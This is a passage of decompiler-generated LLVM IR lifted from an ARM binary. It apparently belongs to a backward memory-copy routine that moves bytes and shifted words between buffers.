  %v6_182d8 = phi i32 [ %v7_182c8, %bb147 ], [ %v6_182c8, %dec_label_pc_182c0 ]
  %v0_182d0 = phi i32 [ %v7_182cc, %bb147 ], [ %v0_182d0.pr, %dec_label_pc_182c0 ]
  %v4_182d0 = add i32 %v0_182d0, 20
  store i32 %v4_182d0, i32* %r2.global-to-local, align 4
  %v6_182d0 = sub i32 0, %v0_182d0
  %v7_182d0 = and i32 %v4_182d0, %v6_182d0
  %v8_182d0 = icmp slt i32 %v7_182d0, 0
  store i1 %v8_182d0, i1* %cpsr_v.global-to-local, align 1
  %v9_182d0 = icmp slt i32 %v4_182d0, 0
  store i1 %v9_182d0, i1* %cpsr_n.global-to-local, align 1
  %v10_182d0 = icmp eq i32 %v4_182d0, 0
  store i1 %v10_182d0, i1* %cpsr_z.global-to-local, align 1
  %v5_182d4 = icmp slt i32 %v0_182d0, -20
  br i1 %v5_182d4, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_182d4 = load i32, i32* %r1.global-to-local, align 4
  %v7_182d4 = add i32 %v6_182d4, -4
  %v8_182d4 = inttoptr i32 %v7_182d4 to i32*
  %v9_182d4 = load i32, i32* %v8_182d4, align 4
  store i32 %v9_182d4, i32* @r3, align 4
  %v10_182d4 = add i32 %v6_182d4, -8
  %v11_182d4 = inttoptr i32 %v10_182d4 to i32*
  %v12_182d4 = load i32, i32* %v11_182d4, align 4
  store i32 %v12_182d4, i32* @ip, align 4
  %v13_182d4 = add i32 %v6_182d4, -12
  %v14_182d4 = inttoptr i32 %v13_182d4 to i32*
  %v15_182d4 = load i32, i32* %v14_182d4, align 4
  store i32 %v15_182d4, i32* %lr.global-to-local, align 4
  store i32 %v13_182d4, i32* %r1.global-to-local, align 4
  %v7_182d8 = add i32 %v6_182d8, -12
  %v8_182d8 = inttoptr i32 %v7_182d8 to i32*
  store i32 %v9_182d4, i32* %v8_182d8, align 4
  %v10_182d8 = add i32 %v6_182d8, -8
  %v11_182d8 = inttoptr i32 %v10_182d8 to i32*
  %v12_182d8 = load i32, i32* @ip, align 4
  store i32 %v12_182d8, i32* %v11_182d8, align 4
  %v13_182d8 = add i32 %v6_182d8, -4
  %v14_182d8 = inttoptr i32 %v13_182d8 to i32*
  %v15_182d8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_182d8, i32* %v14_182d8, align 4
  store i32 %v7_182d8, i32* %r0.global-to-local, align 4
  %v6_182dc = load i32, i32* %r2.global-to-local, align 4
  %v7_182dc = add i32 %v6_182dc, -12
  store i32 %v7_182dc, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_182fc45 = phi i32 [ %v6_182d8, %.thread2 ], [ %v7_182d8, %bb148 ]
  %v0_182e443 = phi i32 [ %v4_182d0, %.thread2 ], [ %v7_182dc, %bb148 ]
  %v2_182e0 = load i8*, i8** %stack_var_-8, align 4
  %v3_182e0 = ptrtoint i8* %v2_182e0 to i32
  store i32 %v3_182e0, i32* @r4, align 4
  store i32 %v8_1829c, i32* @lr, align 4
  br label %dec_label_pc_182e4

dec_label_pc_182e4:                               ; preds = %dec_label_pc_18294, %.thread4
  %v7_182f4 = phi i32 [ %v0_182ac37, %dec_label_pc_18294 ], [ %v6_182fc45, %.thread4 ]
  %v0_182e4 = phi i32 [ %v2_18294, %dec_label_pc_18294 ], [ %v0_182e443, %.thread4 ]
  %v2_182e4 = add i32 %v0_182e4, 8
  store i32 %v2_182e4, i32* %r2.global-to-local, align 4
  %v4_182e4 = sub i32 0, %v0_182e4
  %v5_182e4 = and i32 %v2_182e4, %v4_182e4
  %v6_182e4 = icmp slt i32 %v5_182e4, 0
  store i1 %v6_182e4, i1* %cpsr_v.global-to-local, align 1
  %v7_182e4 = icmp slt i32 %v2_182e4, 0
  store i1 %v7_182e4, i1* %cpsr_n.global-to-local, align 1
  %v8_182e4 = icmp eq i32 %v2_182e4, 0
  store i1 %v8_182e4, i1* %cpsr_z.global-to-local, align 1
  %v5_182e8 = icmp slt i32 %v0_182e4, -8
  br i1 %v5_182e8, label %bb150, label %dec_label_pc_182ec

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182e4
  %v6_182ec = add i32 %v0_182e4, 4
  store i32 %v6_182ec, i32* %r2.global-to-local, align 4
  %v8_182ec = sub i32 -5, %v0_182e4
  %v9_182ec = and i32 %v8_182ec, %v2_182e4
  %v10_182ec = icmp slt i32 %v9_182ec, 0
  store i1 %v10_182ec, i1* %cpsr_v.global-to-local, align 1
  %v11_182ec = icmp slt i32 %v6_182ec, 0
  store i1 %v11_182ec, i1* %cpsr_n.global-to-local, align 1
  %v12_182ec = icmp eq i32 %v2_182e4, 4
  store i1 %v12_182ec, i1* %cpsr_z.global-to-local, align 1
  %v5_182f0 = icmp slt i32 %v2_182e4, 4
  %v6_182f0 = load i32, i32* %r1.global-to-local, align 4
  %v7_182f0 = add i32 %v6_182f0, -4
  %v8_182f0 = inttoptr i32 %v7_182f0 to i32*
  %v9_182f0 = load i32, i32* %v8_182f0, align 4
  store i32 %v9_182f0, i32* @r3, align 4
  br i1 %v5_182f0, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_182ec
  store i32 %v7_182f0, i32* %r1.global-to-local, align 4
  %v8_182f4 = add i32 %v7_182f4, -4
  %v9_182f4 = inttoptr i32 %v8_182f4 to i32*
  store i32 %v9_182f0, i32* %v9_182f4, align 4
  %v10_182f4 = load i32, i32* %r0.global-to-local, align 4
  %v11_182f4 = add i32 %v10_182f4, -4
  store i32 %v11_182f4, i32* %r0.global-to-local, align 4
  %v0_18304.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_182ec
  %v10_182f8 = add i32 %v6_182f0, -8
  %v11_182f8 = inttoptr i32 %v10_182f8 to i32*
  %v12_182f8 = load i32, i32* %v11_182f8, align 4
  store i32 %v12_182f8, i32* @ip, align 4
  store i32 %v10_182f8, i32* %r1.global-to-local, align 4
  %v7_182fc = add i32 %v7_182f4, -8
  %v8_182fc = inttoptr i32 %v7_182fc to i32*
  store i32 %v9_182f0, i32* %v8_182fc, align 4
  %v10_182fc = add i32 %v7_182f4, -4
  %v11_182fc = inttoptr i32 %v10_182fc to i32*
  %v12_182fc = load i32, i32* @ip, align 4
  store i32 %v12_182fc, i32* %v11_182fc, align 4
  store i32 %v7_182fc, i32* %r0.global-to-local, align 4
  %v6_18300 = load i32, i32* %r2.global-to-local, align 4
  %v7_18300 = add i32 %v6_18300, -4
  store i32 %v7_18300, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_182e4, %dec_label_pc_18274, %dec_label_pc_184a8, %dec_label_pc_1843c, %dec_label_pc_183d0, %bb149
  %v2_18308 = phi i32 [ %v11_182f4, %.thread8 ], [ %v0_183a020, %.thread14 ], [ %v7_182f4, %dec_label_pc_182e4 ], [ %v2_18278, %dec_label_pc_18274 ], [ %v2_1831453, %dec_label_pc_184a8 ], [ %v2_1831452, %dec_label_pc_1843c ], [ %v2_1831451, %dec_label_pc_183d0 ], [ %v7_182fc, %bb149 ]
  %v0_18304 = phi i32 [ %v0_18304.pre, %.thread8 ], [ %v2_18348, %.thread14 ], [ %v2_182e4, %dec_label_pc_182e4 ], [ %v2_1827c, %dec_label_pc_18274 ], [ %v0_1830449, %dec_label_pc_184a8 ], [ %v0_1830448, %dec_label_pc_1843c ], [ %v0_1830447, %dec_label_pc_183d0 ], [ %v7_18300, %bb149 ]
  %v1_18304 = add i32 %v0_18304, 4
  store i32 %v1_18304, i32* %r2.global-to-local, align 4
  %v3_18304 = sub i32 0, %v0_18304
  %v4_18304 = and i32 %v1_18304, %v3_18304
  %v5_18304 = icmp slt i32 %v4_18304, 0
  store i1 %v5_18304, i1* %cpsr_v.global-to-local, align 1
  %v6_18304 = icmp slt i32 %v1_18304, 0
  store i1 %v6_18304, i1* %cpsr_n.global-to-local, align 1
  %v7_18304 = icmp eq i32 %v1_18304, 0
  store i1 %v7_18304, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18304, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1830c = add i32 %v0_18304, 2
  %v3_1830c = sub i32 -3, %v0_18304
  %v4_1830c = and i32 %v3_1830c, %v1_18304
  %v5_1830c = icmp slt i32 %v4_1830c, 0
  store i1 %v5_1830c, i1* %cpsr_v.global-to-local, align 1
  %v6_1830c = icmp slt i32 %v1_1830c, 0
  store i1 %v6_1830c, i1* %cpsr_n.global-to-local, align 1
  %v7_1830c = icmp eq i32 %v1_18304, 2
  store i1 %v7_1830c, i1* %cpsr_z.global-to-local, align 1
  %v0_18310 = load i32, i32* %r1.global-to-local, align 4
  %v1_18310 = add i32 %v0_18310, -1
  %v2_18310 = inttoptr i32 %v1_18310 to i8*
  %v3_18310 = load i8, i8* %v2_18310, align 1
  %v4_18310 = zext i8 %v3_18310 to i32
  store i32 %v4_18310, i32* @r3, align 4
  store i32 %v1_18310, i32* %r1.global-to-local, align 4
  %v3_18314 = add i32 %v2_18308, -1
  %v4_18314 = inttoptr i32 %v3_18314 to i8*
  store i8 %v3_18310, i8* %v4_18314, align 1
  %v5_18314 = load i32, i32* %r0.global-to-local, align 4
  %v6_18314 = add i32 %v5_18314, -1
  store i32 %v6_18314, i32* %r0.global-to-local, align 4
  %v0_18318 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18318 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18318 = xor i1 %v0_18318, %v1_18318
  br i1 %v2_18318, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_18318 = load i32, i32* %r1.global-to-local, align 4
  %v4_18318 = add i32 %v3_18318, -1
  %v5_18318 = inttoptr i32 %v4_18318 to i8*
  %v6_18318 = load i8, i8* %v5_18318, align 1
  %v7_18318 = zext i8 %v6_18318 to i32
  store i32 %v7_18318, i32* @r3, align 4
  store i32 %v4_18318, i32* %r1.global-to-local, align 4
  %v6_1831c = add i32 %v5_18314, -2
  %v7_1831c = inttoptr i32 %v6_1831c to i8*
  store i8 %v6_18318, i8* %v7_1831c, align 1
  %v8_1831c = load i32, i32* %r0.global-to-local, align 4
  %v9_1831c = add i32 %v8_1831c, -1
  store i32 %v9_1831c, i32* %r0.global-to-local, align 4
  %v1_18320.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18320.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_18324 = phi i32 [ %v9_1831c, %bb152 ], [ %v6_18314, %bb151 ]
  %v2_18324 = phi i1 [ %v2_18320.pre, %bb152 ], [ %v1_18318, %bb151 ]
  %v1_18324 = phi i1 [ %v1_18320.pre, %bb152 ], [ %v0_18318, %bb151 ]
  %v0_18320 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18320 = xor i1 %v2_18324, %v1_18324
  %v4_18320 = or i1 %v0_18320, %v3_18320
  br i1 %v4_18320, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_18320 = load i32, i32* %r1.global-to-local, align 4
  %v6_18320 = add i32 %v5_18320, -1
  %v7_18320 = inttoptr i32 %v6_18320 to i8*
  %v8_18320 = load i8, i8* %v7_18320, align 1
  %v9_18320 = zext i8 %v8_18320 to i32
  store i32 %v9_18320, i32* @r3, align 4
  store i32 %v6_18320, i32* %r1.global-to-local, align 4
  %v8_18324 = add i32 %v7_18324, -1
  %v9_18324 = inttoptr i32 %v8_18324 to i8*
  store i8 %v8_18320, i8* %v9_18324, align 1
  %v10_18324 = load i32, i32* %r0.global-to-local, align 4
  %v11_18324 = add i32 %v10_18324, -1
  store i32 %v11_18324, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1832c:                               ; preds = %dec_label_pc_18284
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1832c = icmp eq i32 %v1_18284, 1
  store i1 %v8_1832c, i1* %cpsr_n.global-to-local, align 1
  %v9_1832c = icmp eq i32 %v1_18284, 2
  store i1 %v9_1832c, i1* %cpsr_z.global-to-local, align 1
  %v1_18330 = add i32 %v2_18274, -1
  %v2_18330 = inttoptr i32 %v1_18330 to i8*
  %v3_18330 = load i8, i8* %v2_18330, align 1
  %v4_18330 = zext i8 %v3_18330 to i32
  store i32 %v4_18330, i32* @r3, align 4
  store i32 %v1_18330, i32* %r1.global-to-local, align 4
  %v3_18334 = add i32 %v2_18278, -1
  %v4_18334 = inttoptr i32 %v3_18334 to i8*
  store i8 %v3_18330, i8* %v4_18334, align 1
  %v5_18334 = load i32, i32* %r0.global-to-local, align 4
  %v6_18334 = add i32 %v5_18334, -1
  store i32 %v6_18334, i32* %r0.global-to-local, align 4
  br i1 %v8_1832c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1832c
  %v6_18338 = load i32, i32* %r1.global-to-local, align 4
  %v7_18338 = add i32 %v6_18338, -1
  %v8_18338 = inttoptr i32 %v7_18338 to i8*
  %v9_18338 = load i8, i8* %v8_18338, align 1
  %v10_18338 = zext i8 %v9_18338 to i32
  store i32 %v10_18338, i32* @r3, align 4
  store i32 %v7_18338, i32* %r1.global-to-local, align 4
  %v9_1833c = add i32 %v5_18334, -2
  %v10_1833c = inttoptr i32 %v9_1833c to i8*
  store i8 %v9_18338, i8* %v10_1833c, align 1
  %v11_1833c = load i32, i32* %r0.global-to-local, align 4
  %v12_1833c = add i32 %v11_1833c, -1
  store i32 %v12_1833c, i32* %r0.global-to-local, align 4
  br i1 %v9_1832c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18340 = load i32, i32* %r1.global-to-local, align 4
  %v9_18340 = add i32 %v8_18340, -1
  %v10_18340 = inttoptr i32 %v9_18340 to i8*
  %v11_18340 = load i8, i8* %v10_18340, align 1
  %v12_18340 = zext i8 %v11_18340 to i32
  store i32 %v12_18340, i32* @r3, align 4
  store i32 %v9_18340, i32* %r1.global-to-local, align 4
  %v11_18344 = add i32 %v11_1833c, -2
  %v12_18344 = inttoptr i32 %v11_18344 to i8*
  store i8 %v11_18340, i8* %v12_18344, align 1
  %v13_18344 = load i32, i32* %r0.global-to-local, align 4
  %v14_18344 = add i32 %v13_18344, -1
  store i32 %v14_18344, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1832c, %bb155
  %v0_183a020 = phi i32 [ %v12_1833c, %bb154 ], [ %v6_18334, %dec_label_pc_1832c ], [ %v14_18344, %bb155 ]
  %v0_18348 = load i32, i32* %r2.global-to-local, align 4
  %v1_18348 = load i32, i32* @ip, align 4
  %v2_18348 = sub i32 %v0_18348, %v1_18348
  store i32 %v2_18348, i32* %r2.global-to-local, align 4
  %v4_18348 = xor i32 %v1_18348, %v0_18348
  %v5_18348 = xor i32 %v2_18348, %v0_18348
  %v6_18348 = and i32 %v5_18348, %v4_18348
  %v7_18348 = icmp slt i32 %v6_18348, 0
  store i1 %v7_18348, i1* %cpsr_v.global-to-local, align 1
  %v8_18348 = icmp slt i32 %v2_18348, 0
  store i1 %v8_18348, i1* %cpsr_n.global-to-local, align 1
  %v9_18348 = icmp eq i32 %v0_18348, %v1_18348
  store i1 %v9_18348, i1* %cpsr_z.global-to-local, align 1
  %v5_1834c = icmp slt i32 %v0_18348, %v1_18348
  br i1 %v5_1834c, label %bb150, label %dec_label_pc_18350

dec_label_pc_18350:                               ; preds = %.thread14
  %v0_18350 = load i32, i32* %r1.global-to-local, align 4
  %v1_18350 = urem i32 %v0_18350, 4
  store i32 %v1_18350, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18350 = icmp eq i32 %v1_18350, 0
  store i1 %v2_18350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18350, label %dec_label_pc_18294, label %dec_label_pc_18358

dec_label_pc_18358:                               ; preds = %dec_label_pc_1828c, %dec_label_pc_18350
  %v0_183a019 = phi i32 [ %v2_18278, %dec_label_pc_1828c ], [ %v0_183a020, %dec_label_pc_18350 ]
  %v0_1844c = phi i32 [ %v2_1827c, %dec_label_pc_1828c ], [ %v2_18348, %dec_label_pc_18350 ]
  %v0_18358 = phi i32 [ %v2_18274, %dec_label_pc_1828c ], [ %v0_18350, %dec_label_pc_18350 ]
  %v0_18360 = phi i32 [ %v1_1828c, %dec_label_pc_1828c ], [ %v1_18350, %dec_label_pc_18350 ]
  %v1_18358 = and i32 %v0_18358, -4
  store i32 %v1_18358, i32* %r1.global-to-local, align 4
  %v1_1835c = inttoptr i32 %v1_18358 to i32*
  %v2_1835c = load i32, i32* %v1_1835c, align 4
  store i32 %v2_1835c, i32* @r3, align 4
  %v7_18360 = icmp ult i32 %v0_18360, 2
  %v2_18444 = add i32 %v0_1844c, -12
  %v4_18444 = sub i32 11, %v0_1844c
  %v5_18444 = and i32 %v4_18444, %v0_1844c
  %v6_18444 = icmp slt i32 %v5_18444, 0
  store i1 %v6_18444, i1* %cpsr_v.global-to-local, align 1
  %v7_18444 = icmp slt i32 %v2_18444, 0
  store i1 %v7_18444, i1* %cpsr_n.global-to-local, align 1
  %v8_18444 = icmp eq i32 %v0_1844c, 12
  store i1 %v8_18444, i1* %cpsr_z.global-to-local, align 1
  %v5_18448 = icmp slt i32 %v0_1844c, 12
  br i1 %v7_18360, label %dec_label_pc_18444, label %dec_label_pc_18368

dec_label_pc_18368:                               ; preds = %dec_label_pc_18358
  %v8_18360 = icmp eq i32 %v0_18360, 2
  br i1 %v8_18360, label %dec_label_pc_183d8, label %dec_label_pc_1836c

dec_label_pc_1836c:                               ; preds = %dec_label_pc_18368
  br i1 %v5_18448, label %dec_label_pc_183b8, label %dec_label_pc_18374

dec_label_pc_18374:                               ; preds = %dec_label_pc_1836c
  store i32 %v2_18444, i32* %r2.global-to-local, align 4
  %v3_18378 = load i32, i32* @r4, align 4
  store i32 %v3_18378, i32* %stack_var_-12, align 4
  %v6_18378 = load i32, i32* @r5, align 4
  %v8_18378 = inttoptr i32 %v6_18378 to i8*
  store i8* %v8_18378, i8** %stack_var_-8, align 4
  %v11_18378 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1837c

dec_label_pc_1837c:                               ; preds = %dec_label_pc_1837c.dec_label_pc_1837c_crit_edge, %dec_label_pc_18374
  %v0_183a0 = phi i32 [ %v1_183a0, %dec_label_pc_1837c.dec_label_pc_1837c_crit_edge ], [ %v0_183a019, %dec_label_pc_18374 ]
  %v0_18380 = phi i32 [ %v0_18380.pre, %dec_label_pc_1837c.dec_label_pc_1837c_crit_edge ], [ %v1_18358, %dec_label_pc_18374 ]
  %v0_1837c = phi i32 [ %v0_1837c.pre, %dec_label_pc_1837c.dec_label_pc_1837c_crit_edge ], [ %v2_1835c, %dec_label_pc_18374 ]
  %v3_1837c = mul i32 %v0_1837c, 256
  store i32 %v3_1837c, i32* %lr.global-to-local, align 4
  %v1_18380 = add i32 %v0_18380, -4
  %v2_18380 = inttoptr i32 %v1_18380 to i32*
  %v3_18380 = load i32, i32* %v2_18380, align 4
  store i32 %v3_18380, i32* @r3, align 4
  %v4_18380 = add i32 %v0_18380, -8
  %v5_18380 = inttoptr i32 %v4_18380 to i32*
  %v6_18380 = load i32, i32* %v5_18380, align 4
  store i32 %v6_18380, i32* %r4.global-to-local, align 4
  %v7_18380 = add i32 %v0_18380, -12
  %v8_18380 = inttoptr i32 %v7_18380 to i32*
  %v9_18380 = load i32, i32* %v8_18380, align 4
  store i32 %v9_18380, i32* %r5.global-to-local, align 4
  %v10_18380 = add i32 %v0_18380, -16
  %v11_18380 = inttoptr i32 %v10_18380 to i32*
  %v12_18380 = load i32, i32* %v11_18380, align 4
  store i32 %v10_18380, i32* %r1.global-to-local, align 4
  %v4_18384 = udiv i32 %v12_18380, 16777216
  %v5_18384 = or i32 %v4_18384, %v3_1837c
  store i32 %v5_18384, i32* %lr.global-to-local, align 4
  %v3_18388 = mul i32 %v12_18380, 256
  %v4_1838c = udiv i32 %v9_18380, 16777216
  %v5_1838c = or i32 %v3_18388, %v4_1838c
  store i32 %v5_1838c, i32* @ip, align 4
  %v3_18390 = mul i32 %v9_18380, 256
  %v4_18394 = udiv i32 %v6_18380, 16777216
  %v5_18394 = or i32 %v3_18390, %v4_18394
  store i32 %v5_18394, i32* %r5.global-to-local, align 4
  %v3_18398 = mul i32 %v6_18380, 256
  %v4_1839c = udiv i32 %v3_18380, 16777216
  %v5_1839c = or i32 %v3_18398, %v4_1839c
  store i32 %v5_1839c, i32* %r4.global-to-local, align 4
  %v1_183a0 = add i32 %v0_183a0, -16
  %v2_183a0 = inttoptr i32 %v1_183a0 to i32*
  store i32 %v5_1839c, i32* %v2_183a0, align 4
  %v4_183a0 = add i32 %v0_183a0, -12
  %v5_183a0 = inttoptr i32 %v4_183a0 to i32*
  %v6_183a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_183a0, i32* %v5_183a0, align 4
  %v7_183a0 = add i32 %v0_183a0, -8
  %v8_183a0 = inttoptr i32 %v7_183a0 to i32*
  %v9_183a0 = load i32, i32* @ip, align 4
  store i32 %v9_183a0, i32* %v8_183a0, align 4
  %v10_183a0 = add i32 %v0_183a0, -4
  %v11_183a0 = inttoptr i32 %v10_183a0 to i32*
  %v12_183a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_183a0, i32* %v11_183a0, align 4
  store i32 %v1_183a0, i32* %r0.global-to-local, align 4
  %v0_183a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_183a4 = add i32 %v0_183a4, -16
  store i32 %v2_183a4, i32* %r2.global-to-local, align 4
  %v6_183a8 = icmp slt i32 %v0_183a4, 16
  br i1 %v6_183a8, label %dec_label_pc_183ac, label %dec_label_pc_1837c.dec_label_pc_1837c_crit_edge

dec_label_pc_1837c.dec_label_pc_1837c_crit_edge:  ; preds = %dec_label_pc_1837c
  %v0_1837c.pre = load i32, i32* @r3, align 4
  %v0_18380.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1837c

dec_label_pc_183ac:                               ; preds = %dec_label_pc_1837c
  %v2_183ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_183ac, i32* @r4, align 4
  %v5_183ac = load i8*, i8** %stack_var_-8, align 4
  %v6_183ac = ptrtoint i8* %v5_183ac to i32
  store i32 %v6_183ac, i32* @r5, align 4
  store i32 %v11_18378, i32* @lr, align 4
  %v2_183b0 = add i32 %v0_183a4, -4
  store i32 %v2_183b0, i32* %r2.global-to-local, align 4
  %v4_183b0 = add i32 %v0_183a4, 2147483632
  %v5_183b0 = and i32 %v2_183b0, %v4_183b0
  %v6_183b0 = icmp slt i32 %v5_183b0, 0
  store i1 %v6_183b0, i1* %cpsr_v.global-to-local, align 1
  %v7_183b0 = icmp slt i32 %v2_183b0, 0
  store i1 %v7_183b0, i1* %cpsr_n.global-to-local, align 1
  %v8_183b0 = icmp eq i32 %v2_183b0, 0
  store i1 %v8_183b0, i1* %cpsr_z.global-to-local, align 1
  %v5_183b4 = icmp slt i32 %v2_183a4, -12
  br i1 %v5_183b4, label %dec_label_pc_183d0, label %dec_label_pc_183b8

dec_label_pc_183b8:                               ; preds = %dec_label_pc_183ac, %dec_label_pc_1836c, %dec_label_pc_183b8
  %v1_183c4 = phi i32 [ %v5_183c4, %dec_label_pc_183b8 ], [ %v1_183a0, %dec_label_pc_183ac ], [ %v0_183a019, %dec_label_pc_1836c ]
  %v0_183b8 = load i32, i32* @r3, align 4
  %v3_183b8 = mul i32 %v0_183b8, 256
  store i32 %v3_183b8, i32* %ip.global-to-local, align 4
  %v0_183bc = load i32, i32* %r1.global-to-local, align 4
  %v1_183bc = add i32 %v0_183bc, -4
  %v2_183bc = inttoptr i32 %v1_183bc to i32*
  %v3_183bc = load i32, i32* %v2_183bc, align 4
  store i32 %v3_183bc, i32* @r3, align 4
  store i32 %v1_183bc, i32* %r1.global-to-local, align 4
  %v4_183c0 = udiv i32 %v3_183bc, 16777216
  %v5_183c0 = or i32 %v4_183c0, %v3_183b8
  store i32 %v5_183c0, i32* @ip, align 4
  %v2_183c4 = add i32 %v1_183c4, -4
  %v3_183c4 = inttoptr i32 %v2_183c4 to i32*
  store i32 %v5_183c0, i32* %v3_183c4, align 4
  %v4_183c4 = load i32, i32* %r0.global-to-local, align 4
  %v5_183c4 = add i32 %v4_183c4, -4
  store i32 %v5_183c4, i32* %r0.global-to-local, align 4
  %v0_183c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_183c8 = add i32 %v0_183c8, -4
  store i32 %v2_183c8, i32* %r2.global-to-local, align 4
  %v6_183cc = icmp slt i32 %v0_183c8, 4
  br i1 %v6_183cc, label %dec_label_pc_183d0.loopexit, label %dec_label_pc_183b8

dec_label_pc_183d0.loopexit:                      ; preds = %dec_label_pc_183b8
  %v4_183c8 = sub i32 3, %v0_183c8
  %v5_183c8 = and i32 %v4_183c8, %v0_183c8
  %v6_183c8 = icmp slt i32 %v5_183c8, 0
  %v7_183c8 = icmp slt i32 %v2_183c8, 0
  store i1 %v6_183c8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_183c8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_183d0

dec_label_pc_183d0:                               ; preds = %dec_label_pc_183d0.loopexit, %dec_label_pc_183ac
  %v2_1831451 = phi i32 [ %v5_183c4, %dec_label_pc_183d0.loopexit ], [ %v1_183a0, %dec_label_pc_183ac ]
  %v0_1830447 = phi i32 [ %v2_183c8, %dec_label_pc_183d0.loopexit ], [ %v2_183b0, %dec_label_pc_183ac ]
  %v0_183d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_183d0 = add i32 %v0_183d0, 3
  store i32 %v1_183d0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_183d8:                               ; preds = %dec_label_pc_18368
  br i1 %v5_18448, label %dec_label_pc_18424, label %dec_label_pc_183e0

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183d8
  store i32 %v2_18444, i32* %r2.global-to-local, align 4
  %v3_183e4 = load i32, i32* @r4, align 4
  store i32 %v3_183e4, i32* %stack_var_-12, align 4
  %v6_183e4 = load i32, i32* @r5, align 4
  %v8_183e4 = inttoptr i32 %v6_183e4 to i8*
  store i8* %v8_183e4, i8** %stack_var_-8, align 4
  %v11_183e4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183e8:                               ; preds = %dec_label_pc_183e8.dec_label_pc_183e8_crit_edge, %dec_label_pc_183e0
  %v0_1840c = phi i32 [ %v1_1840c, %dec_label_pc_183e8.dec_label_pc_183e8_crit_edge ], [ %v0_183a019, %dec_label_pc_183e0 ]
  %v0_183ec = phi i32 [ %v0_183ec.pre, %dec_label_pc_183e8.dec_label_pc_183e8_crit_edge ], [ %v1_18358, %dec_label_pc_183e0 ]
  %v0_183e8 = phi i32 [ %v0_183e8.pre, %dec_label_pc_183e8.dec_label_pc_183e8_crit_edge ], [ %v2_1835c, %dec_label_pc_183e0 ]
  %v3_183e8 = mul i32 %v0_183e8, 65536
  store i32 %v3_183e8, i32* %lr.global-to-local, align 4
  %v1_183ec = add i32 %v0_183ec, -4
  %v2_183ec = inttoptr i32 %v1_183ec to i32*
  %v3_183ec = load i32, i32* %v2_183ec, align 4
  store i32 %v3_183ec, i32* @r3, align 4
  %v4_183ec = add i32 %v0_183ec, -8
  %v5_183ec = inttoptr i32 %v4_183ec to i32*
  %v6_183ec = load i32, i32* %v5_183ec, align 4
  store i32 %v6_183ec, i32* %r4.global-to-local, align 4
  %v7_183ec = add i32 %v0_183ec, -12
  %v8_183ec = inttoptr i32 %v7_183ec to i32*
  %v9_183ec = load i32, i32* %v8_183ec, align 4
  store i32 %v9_183ec, i32* %r5.global-to-local, align 4
  %v10_183ec = add i32 %v0_183ec, -16
  %v11_183ec = inttoptr i32 %v10_183ec to i32*
  %v12_183ec = load i32, i32* %v11_183ec, align 4
  store i32 %v10_183ec, i32* %r1.global-to-local, align 4
  %v4_183f0 = udiv i32 %v12_183ec, 65536
  %v5_183f0 = or i32 %v4_183f0, %v3_183e8
  store i32 %v5_183f0, i32* %lr.global-to-local, align 4
  %v3_183f4 = mul i32 %v12_183ec, 65536
  %v4_183f8 = udiv i32 %v9_183ec, 65536
  %v5_183f8 = or i32 %v3_183f4, %v4_183f8
  store i32 %v5_183f8, i32* @ip, align 4
  %v3_183fc = mul i32 %v9_183ec, 65536
  %v4_18400 = udiv i32 %v6_183ec, 65536
  %v5_18400 = or i32 %v3_183fc, %v4_18400
  store i32 %v5_18400, i32* %r5.global-to-local, align 4
  %v3_18404 = mul i32 %v6_183ec, 65536
  %v4_18408 = udiv i32 %v3_183ec, 65536
  %v5_18408 = or i32 %v3_18404, %v4_18408
  store i32 %v5_18408, i32* %r4.global-to-local, align 4
  %v1_1840c = add i32 %v0_1840c, -16
  %v2_1840c = inttoptr i32 %v1_1840c to i32*
  store i32 %v5_18408, i32* %v2_1840c, align 4
  %v4_1840c = add i32 %v0_1840c, -12
  %v5_1840c = inttoptr i32 %v4_1840c to i32*
  %v6_1840c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1840c, i32* %v5_1840c, align 4
  %v7_1840c = add i32 %v0_1840c, -8
  %v8_1840c = inttoptr i32 %v7_1840c to i32*
  %v9_1840c = load i32, i32* @ip, align 4
  store i32 %v9_1840c, i32* %v8_1840c, align 4
  %v10_1840c = add i32 %v0_1840c, -4
  %v11_1840c = inttoptr i32 %v10_1840c to i32*
  %v12_1840c = load i32, i32* %lr.global-to-local, align 4
